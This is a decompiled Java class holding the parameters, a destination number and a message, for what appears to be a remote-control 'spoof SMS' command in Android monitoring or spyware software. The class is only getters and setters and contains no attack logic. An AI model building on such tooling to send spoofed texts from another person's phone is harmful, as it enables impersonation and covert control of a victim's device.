package com.vvt.remotecontrol.input;

import java.io.Serializable;

public class RmtCtrlInputSpoofSms
  implements Serializable
{
  private static final long serialVersionUID = 2319963328444579868L;
  private String destinationNumber;
  private String smsMessage;
  
  public String getDestinationNumber()
  {
    return this.destinationNumber;
  }
  
  public String getSmsMessage()
  {
    return this.smsMessage;
  }
  
  public void setDestinationNumber(String paramString)
  {
    this.destinationNumber = paramString;
  }
  
  public void setSmsMessage(String paramString)
  {
    this.smsMessage = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputSpoofSms.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */